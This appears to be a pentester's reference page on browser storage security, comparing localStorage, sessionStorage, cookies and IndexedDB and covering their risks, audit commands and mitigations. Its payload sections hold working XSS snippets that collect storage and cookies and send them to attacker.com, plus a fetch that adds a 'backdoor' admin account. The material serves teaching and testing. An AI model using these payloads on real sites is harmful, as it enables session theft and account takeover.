# Web Storage Security

> **Web storage APIs let browsers store data locally — but each mechanism has different security properties, and sensitive data stored client-side is one XSS payload away from theft.**

---

## 🧠 What Is It? (Beginner Explanation)

Browsers offer several ways for web applications to persist data client-side:

| Storage | Capacity | Persistence | Scope | HTTP Access |
|---------|----------|-------------|-------|-------------|
| **localStorage** | ~5-10MB | Forever | Origin | No |
| **sessionStorage** | ~5-10MB | Tab session | Tab + Origin | No |
| **Cookies** | ~4KB | Configurable | Domain + Path | Yes (unless HttpOnly) |
| **IndexedDB** | >50MB | Forever | Origin | No |
| **Cache API** | Variable | Forever | Origin | No |

The key security question: **What can read this data, and what damage does compromise cause?**

As a pentester, you care about:
1. What sensitive data is stored (tokens, PII, keys)
2. Whether XSS can steal it
3. Whether the wrong origin can access it
4. Whether insecure flags on cookies enable attacks

---

## 🏗️ How It Works (Technical Deep Dive)

### localStorage

```javascript
// API — synchronous, simple key-value
localStorage.setItem("token", "eyJhbGciOiJIUzI1NiJ9...");
localStorage.setItem("user", JSON.stringify({ id: 42, role: "admin" }));

const token = localStorage.getItem("token");        // Returns string or null
const user = JSON.parse(localStorage.getItem("user"));

localStorage.removeItem("token");                   // Remove one key
localStorage.clear();                               // Remove ALL keys

// Enumerate all items
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(key, "=", localStorage.getItem(key));
}

// Properties
localStorage.length;    // Number of stored items

// Storage event (fires in OTHER tabs of same origin when storage changes)
window.addEventListener("storage", (e) => {
  console.log("Key:", e.key, "New:", e.newValue, "Old:", e.oldValue);
});
```

**Security properties:**
- Accessible to any JavaScript running on the same origin
- NOT sent with HTTP requests automatically
- Persists across browser restarts, tabs, windows
- No expiration mechanism
- No HttpOnly equivalent — JavaScript **always** has access

### sessionStorage

```javascript
// Same API as localStorage
sessionStorage.setItem("sessionId", "abc123");
const id = sessionStorage.getItem("sessionId");

// KEY DIFFERENCE: Tab-isolated!
// Opening same URL in new tab = empty sessionStorage
// Duplicating tab (Ctrl+Shift+D) = COPIES sessionStorage
// Navigation within same tab = data persists
// Tab close / browser close = data cleared
```

**Security properties:**
- Tab-scoped (more isolated than localStorage)
- Same origin restriction applies
- Still accessible to JavaScript — XSS can steal it
- Cleared when tab closes (not on refresh!)

### Cookies

```javascript
// Setting cookies via JavaScript
document.cookie = "session=abc123; path=/; secure; samesite=strict";
document.cookie = "theme=dark; path=/; expires=Fri, 31 Dec 2025 23:59:59 GMT";

// Reading cookies — returns all accessible cookies as a string
console.log(document.cookie);
// "session=abc123; theme=dark"
// HttpOnly cookies NOT included!

// Parse cookies
const parseCookies = (str) =>
  str.split(";").reduce((acc, cookie) => {
    const [k, v] = cookie.trim().split("=");
    acc[k] = v;
    return acc;
  }, {});

const cookies = parseCookies(document.cookie);
console.log(cookies.session); // "abc123"

// Cookies are sent with EVERY matching HTTP request automatically!
```

**Cookie Attributes:**

| Attribute | Purpose | Security Impact |
|-----------|---------|----------------|
| `HttpOnly` | Hides cookie from JavaScript | Prevents XSS cookie theft |
| `Secure` | Only send over HTTPS | Prevents HTTP interception |
| `SameSite=Strict` | Never sent cross-site | Strong CSRF protection |
| `SameSite=Lax` | Sent on top-level GET navigation | Moderate CSRF protection |
| `SameSite=None` | Sent in all contexts | Requires Secure flag |
| `Domain=.example.com` | Accessible to all subdomains | Subdomain XSS can steal |
| `Path=/api` | Only sent for /api paths | Limited scope |
| `Expires=` / `Max-Age=` | Expiry time | Session vs persistent |

### IndexedDB

```javascript
// Async, structured, large-capacity storage
const request = indexedDB.open("AppDB", 1);

request.onupgradeneeded = function(event) {
  const db = event.target.result;
  const store = db.createObjectStore("users", { keyPath: "id" });
  store.createIndex("email", "email", { unique: true });
};

request.onsuccess = function(event) {
  const db = event.target.result;
  
  // Write data
  const tx = db.transaction("users", "readwrite");
  tx.objectStore("users").put({
    id: 1,
    email: "alice@example.com",
    token: "secret-jwt-token",    // BAD: sensitive data in IndexedDB
    privateKey: "-----BEGIN RSA..." // VERY BAD
  });
  
  // Read data
  const readTx = db.transaction("users", "readonly");
  readTx.objectStore("users").get(1).onsuccess = (e) => {
    console.log(e.target.result);
  };
};
```

---

## 📊 Diagram

```mermaid
graph TD
    A[Web Application on example.com] --> B[localStorage]
    A --> C[sessionStorage]
    A --> D[Cookies]
    A --> E[IndexedDB]

    F[JavaScript on example.com] -->|Can Read/Write| B
    F -->|Can Read/Write| C
    F -->|Can Read non-HttpOnly| D
    F -->|Can Read/Write| E

    G[HTTP Request to example.com] -->|NEVER auto-sent| B
    G -->|NEVER auto-sent| C
    G -->|AUTO-SENT with every request| D
    G -->|NEVER auto-sent| E

    H[XSS on example.com] -->|STEAL| B
    H -->|STEAL| C
    H -->|STEAL non-HttpOnly| D
    H -->|STEAL| E

    I[script on evil.com] -->|BLOCKED by SOP| B
    I -->|BLOCKED by SOP| C
    I -->|BLOCKED by SOP| D
    I -->|BLOCKED by SOP| E

    J[example.com subdomain - sub.example.com] -->|BLOCKED| B
    J -->|BLOCKED| C
    J -->|Depends on Domain attribute| D
    J -->|BLOCKED| E

    style H fill:#ff6b6b
    style G fill:#4ecdc4
    style I fill:#95a5a6
```



---

## ⚙️ Technical Details

### Complete Comparison Table

| Feature | localStorage | sessionStorage | Cookies | IndexedDB |
|---------|-------------|----------------|---------|-----------|
| **Capacity** | 5-10MB | 5-10MB | ~4KB | 50MB+ |
| **Persistence** | Forever | Tab session | Configurable | Forever |
| **Scope** | Origin | Origin + Tab | Domain + Path | Origin |
| **Auto HTTP** | ❌ | ❌ | ✅ | ❌ |
| **JS Access** | ✅ Always | ✅ Always | ✅ (no HttpOnly) | ✅ Always |
| **HttpOnly** | ❌ N/A | ❌ N/A | ✅ | ❌ N/A |
| **Expiry** | None | Tab close | Configurable | None |
| **API** | Sync | Sync | String | Async |
| **Server Access** | ❌ | ❌ | ✅ | ❌ |
| **XSS Risk** | 🔴 High | 🔴 High | 🟠 Medium (HttpOnly helps) | 🔴 High |
| **CSRF Risk** | 🟢 Low | 🟢 Low | 🔴 High | 🟢 Low |

### What Sensitive Data Apps Commonly Store

```javascript
// Real examples of what vulnerable apps store in localStorage:
// (Seen in bug bounties and CVEs)

// JWT tokens (extremely common)
localStorage.getItem("token")           // Raw JWT
localStorage.getItem("id_token")        // OAuth ID token
localStorage.getItem("access_token")    // OAuth access token
localStorage.getItem("refresh_token")   // Long-lived refresh token

// User information
localStorage.getItem("user")            // JSON with name, email, role
localStorage.getItem("userId")
localStorage.getItem("isAdmin")         // "true" / "false" — auth bypass!

// API credentials
localStorage.getItem("apiKey")
localStorage.getItem("clientSecret")
localStorage.getItem("authHeader")

// Sensitive state
localStorage.getItem("cartItems")       // May include pricing
localStorage.getItem("pendingOrder")
localStorage.getItem("lastSearch")      // PII if medical/financial

// Next.js / React apps often expose state in __NEXT_DATA__
JSON.parse(document.getElementById("__NEXT_DATA__").textContent)
// Can contain entire application state including user data, tokens
```

---

## 🔴 Attack Surface & Exploitation

### XSS to Full localStorage Dump

```javascript
// Method 1: Dump all localStorage to console (pentesting)
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  console.log(`[localStorage] ${key}: ${localStorage.getItem(key)}`);
}

// Method 2: Exfiltrate all localStorage data to attacker server
(function() {
  const data = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
  }
  // Also grab sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    data["session_" + key] = sessionStorage.getItem(key);
  }
  // Add cookies too (non-HttpOnly ones)
  data["cookies"] = document.cookie;
  data["url"] = location.href;
  
  // Exfiltrate via image (works when fetch is CSP-blocked)
  new Image().src = "https://attacker.com/steal?" + 
    encodeURIComponent(btoa(JSON.stringify(data)));
    
  // Exfiltrate via fetch (if allowed by CSP)
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify(data),
    headers: { "Content-Type": "application/json" }
  });
})();
```

```html
<!-- Full XSS payload that steals all storage -->
<script>
!function(){
  var d={ls:{},ss:{},c:document.cookie,u:location.href};
  for(var i=0;i<localStorage.length;i++){
    var k=localStorage.key(i);
    d.ls[k]=localStorage.getItem(k);
  }
  for(var i=0;i<sessionStorage.length;i++){
    var k=sessionStorage.key(i);
    d.ss[k]=sessionStorage.getItem(k);
  }
  new Image().src='//attacker.com/x?d='+btoa(JSON.stringify(d));
}();
</script>
```

### Inspecting Web Storage in DevTools

```
Chrome DevTools — Application Tab:
  Left panel → Storage section:
    → Local Storage → [origin] → key/value table
    → Session Storage → [origin] → key/value table
    → IndexedDB → [DB name] → [Object Store] → browse records
    → Cookies → [domain] → full cookie table with all attributes

Useful DevTools commands:
  // Quick view in console
  Object.entries(localStorage)
  Object.entries(sessionStorage)
  
  // Search for specific patterns
  Object.keys(localStorage).filter(k => k.includes("token"))
  
  // Decode JWT found in storage
  const token = localStorage.getItem("token");
  const [h, p, s] = token.split(".");
  console.log(JSON.parse(atob(p))); // Decode payload
```

### JWT in localStorage vs Cookies

```
DEBATE: Where should JWTs be stored?

localStorage:
  PROS: Easy to access, works across tabs, no CSRF risk
  CONS: Accessible to ALL JS on the page — one XSS = token theft = persistent compromise

Cookies (HttpOnly + Secure + SameSite):
  PROS: Not accessible to JS (HttpOnly), auto-expiry, SameSite prevents CSRF
  CONS: CSRF risk if SameSite not set, subdomain scope issues

VERDICT for pentesters: Finding JWTs in localStorage = HIGH severity finding.
It means one XSS vulnerability becomes account takeover, even after password reset
(because the token persists forever in storage).
```

### DevTools: Inspecting Cookies

```
Application → Cookies → domain → view all attributes:
  Name    | Value        | Domain      | Path | Expires | Size | HttpOnly | Secure | SameSite
  session | eyJhbGc...   | example.com | /    | session | 234  | ✅       | ✅     | Strict
  theme   | dark         | example.com | /    | never   | 10   | ❌       | ❌     | None
  
Red flags to note:
  - HttpOnly = ❌ → XSS can steal this cookie
  - Secure = ❌ → Cookie sent over HTTP → interception possible
  - SameSite = None → CSRF possible if Secure is also missing
  - Domain = .example.com → accessible to all subdomains
  - Long expiry / "never" → persistent session token
```

---

## 💥 Payloads & Examples

### Cookie Theft via XSS

```javascript
// Steal accessible cookies (non-HttpOnly)
new Image().src = "https://attacker.com/steal?c=" + encodeURIComponent(document.cookie);

// More stealthy — use sendBeacon (doesn't block rendering)
navigator.sendBeacon("https://attacker.com/steal", document.cookie);

// Use WebSocket for real-time exfiltration
const ws = new WebSocket("wss://attacker.com");
ws.onopen = () => ws.send(JSON.stringify({
  cookies: document.cookie,
  storage: Object.fromEntries(Object.entries(localStorage))
}));

// XSS → CSRF via stored token
const token = localStorage.getItem("csrf_token");
const sessionToken = localStorage.getItem("token");
fetch("https://victim.com/api/admin/add-user", {
  method: "POST",
  headers: {
    "Authorization": "Bearer " + sessionToken,
    "X-CSRF-Token": token
  },
  body: JSON.stringify({ username: "backdoor", password: "pwned", role: "admin" })
});
```

### Secure vs Insecure Code Examples

```javascript
// ❌ INSECURE: JWT in localStorage
function loginInsecure(credentials) {
  return fetch("/api/login", { method: "POST", body: JSON.stringify(credentials) })
    .then(r => r.json())
    .then(data => {
      localStorage.setItem("token", data.jwt);  // One XSS = permanent account takeover
      localStorage.setItem("user", JSON.stringify(data.user));
    });
}

// ✅ SECURE: Use HttpOnly cookie (set server-side)
// Server response should set:
// Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
// Client-side: just use credentials: "include" in fetch
function loginSecure(credentials) {
  return fetch("/api/login", {
    method: "POST",
    body: JSON.stringify(credentials),
    credentials: "include"  // Server sets HttpOnly cookie
  });
  // No token handling needed client-side!
}

// ❌ INSECURE: Sensitive data in localStorage
localStorage.setItem("userSSN", "123-45-6789");
localStorage.setItem("creditCard", "4111111111111111");
localStorage.setItem("privateKey", privateKeyPem);

// ✅ SECURE: Keep sensitive data server-side
// Only store non-sensitive preferences client-side
localStorage.setItem("theme", "dark");
localStorage.setItem("language", "en");
// Sensitive data lives only in server session

// ❌ INSECURE: Read from storage directly to DOM
document.getElementById("greeting").innerHTML =
  "Welcome, " + localStorage.getItem("username");  // XSS if username was tampered!

// ✅ SECURE: Validate and sanitize before use
const username = localStorage.getItem("username");
if (/^[a-zA-Z0-9 ]{1,50}$/.test(username)) {
  document.getElementById("greeting").textContent = "Welcome, " + username;
} else {
  document.getElementById("greeting").textContent = "Welcome!";
}
```

### Storage Event Eavesdropping

```javascript
// If attacker has XSS on same origin, they can listen for storage changes in real time
// (storage events fire in OTHER tabs, not the same one that triggered the change)

// Attacker plants this on the page via XSS:
window.addEventListener("storage", (event) => {
  if (event.key && event.key.toLowerCase().includes("token")) {
    fetch("https://attacker.com/steal?key=" + event.key + "&val=" + event.newValue);
  }
});
// Now if victim opens the app in another tab and logs in, token is exfiltrated!
```

---

## 🛠️ Tools & Commands

### Browser Console Storage Inspection

```javascript
// Complete storage audit one-liner (run in target's console)
(function audit() {
  const report = { localStorage: {}, sessionStorage: {}, cookies: {} };
  
  // localStorage
  for (let i = 0; i < localStorage.length; i++) {
    const k = localStorage.key(i);
    report.localStorage[k] = localStorage.getItem(k);
  }
  
  // sessionStorage
  for (let i = 0; i < sessionStorage.length; i++) {
    const k = sessionStorage.key(i);
    report.sessionStorage[k] = sessionStorage.getItem(k);
  }
  
  // Cookies (non-HttpOnly only)
  document.cookie.split(";").forEach(c => {
    const [k, v] = c.trim().split("=");
    report.cookies[k] = v;
  });
  
  console.log(JSON.stringify(report, null, 2));
  return report;
})();
```

### grep Patterns to Find Insecure Storage Usage

```bash
# Find JWT/token storage in localStorage
grep -rn "localStorage.setItem.*token\|localStorage.setItem.*jwt\|localStorage.setItem.*auth" \
  --include="*.js" --include="*.ts" --include="*.jsx" --include="*.tsx" ./

# Find sensitive data storage
grep -rn -i "localStorage.setItem.*\(password\|secret\|key\|ssn\|credit\|card\|private\)" \
  --include="*.js" ./

# Find reads from localStorage fed into DOM (potential XSS chain)
grep -rn "localStorage.getItem" --include="*.js" ./ | while read line; do
  varname=$(echo "$line" | grep -oP "(?<=const|var|let)\s+\w+")
  echo "=== $line"
done

# Find cookie attribute issues (missing HttpOnly/Secure in server code)
grep -rn "Set-Cookie\|setCookie\|res.cookie" --include="*.js" --include="*.py" --include="*.rb" ./
grep -rn "httpOnly.*false\|secure.*false\|sameSite.*none" --include="*.js" -i ./

# Find IndexedDB usage with sensitive data
grep -rn "indexedDB.open\|IDBFactory\|objectStore" --include="*.js" ./
```

### Automated Testing Tools

```bash
# Test cookie attributes with curl
curl -sv "https://target.com/login" \
  -X POST \
  -d "user=test&pass=test" 2>&1 | grep -i "set-cookie"

# Test if cookies have correct flags
curl -sv "https://target.com/" 2>&1 | grep -i "set-cookie" | while read line; do
  echo "$line"
  echo "$line" | grep -iq "httponly" || echo "  ⚠️  MISSING HttpOnly"
  echo "$line" | grep -iq "secure" || echo "  ⚠️  MISSING Secure"
  echo "$line" | grep -iq "samesite" || echo "  ⚠️  MISSING SameSite"
done

# Cookie security check with nikto
nikto -host https://target.com -Tuning 9

# Use custom script to check all cookies
python3 -c "
import requests
r = requests.get('https://target.com', allow_redirects=True)
for cookie in r.cookies:
    print(f'Cookie: {cookie.name}')
    print(f'  Value: {cookie.value[:20]}...')
    print(f'  HttpOnly: {cookie.has_nonstandard_attr(\"httponly\")}')
    print(f'  Secure: {cookie.secure}')
    print(f'  SameSite: {cookie.get_nonstandard_attr(\"samesite\", \"NOT SET\")}')
    print()
"
```

---

## 🔍 Detection

### Web Storage Security Checklist

```
[ ] Identify all storage mechanisms in use
    - Application tab in DevTools
    - Note ALL keys/values stored

[ ] Check localStorage for sensitive data
    - JWTs / access tokens
    - API keys / secrets
    - PII (names, emails, SSNs)
    - Password hashes
    - Private keys

[ ] Assess XSS risk to stored data
    - If XSS exists anywhere on the origin → all localStorage is compromised
    - HttpOnly cookies survive XSS — localStorage does not

[ ] Check cookie attributes
    - HttpOnly missing → XSS can steal session
    - Secure missing → transmitted over HTTP
    - SameSite missing/None → CSRF risk
    - Domain too broad (.example.com) → subdomain XSS can steal

[ ] Check cookie scope (Domain/Path)
    - Is session cookie scoped to all subdomains?
    - Any subdomain could have different security posture

[ ] Check for client-side authentication decisions
    - isAdmin stored in localStorage?
    - role stored in localStorage?
    - These can be tampered by user: localStorage.setItem("isAdmin", "true")

[ ] Test JWT if found in storage
    - Decode header: algorithm? (none algorithm attack)
    - Decode payload: expiry, scopes, claims
    - Try manipulating stored JWT

[ ] Check for data persistence after logout
    - Log in, store items in storage, log out
    - Check if tokens cleared from storage
    - Often: server session destroyed but localStorage token remains!
```

---

## 🛡️ Mitigation

```javascript
// ✅ Server sets secure cookies (Node.js / Express)
res.cookie("session", token, {
  httpOnly: true,      // No JS access
  secure: true,        // HTTPS only
  sameSite: "strict",  // No cross-site sending
  maxAge: 3600000,     // 1 hour expiry
  path: "/"
});

// ✅ Clear ALL storage on logout
function secureLogout() {
  // Clear localStorage
  localStorage.clear();
  // Clear sessionStorage
  sessionStorage.clear();
  // Clear IndexedDB
  indexedDB.deleteDatabase("AppDB");
  // Invalidate server session + cookie via API
  return fetch("/api/logout", { method: "POST", credentials: "include" });
}

// ✅ Only store non-sensitive preferences client-side
// ❌ DON'T store:
localStorage.setItem("token", jwt);
localStorage.setItem("password", pass);
localStorage.setItem("ssn", userSSN);
// ✅ DO store:
localStorage.setItem("theme", "dark");
localStorage.setItem("language", "en-US");
localStorage.setItem("recentSearches", JSON.stringify(queries)); // Not sensitive

// ✅ Validate storage integrity
function getStoredUser() {
  const raw = localStorage.getItem("user");
  if (!raw) return null;
  try {
    const user = JSON.parse(raw);
    // Never trust client-side role claims — verify server-side
    // This is UI-only, server enforces actual auth
    if (!user.id || typeof user.id !== "number") throw new Error("Invalid");
    return user;
  } catch {
    localStorage.removeItem("user");
    return null;
  }
}

// ✅ Use Content-Security-Policy to limit XSS impact
// Even if XSS occurs, CSP can block exfiltration to attacker server:
// Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com
```

---

## 📚 References

- [OWASP - HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN - Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN - Using cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [JWT Security Best Practices](https://curity.io/resources/learn/jwt-best-practices/)
- [PortSwigger - Testing for Sensitive Data in Client-Side Storage](https://portswigger.net/web-security/information-disclosure/exploiting)
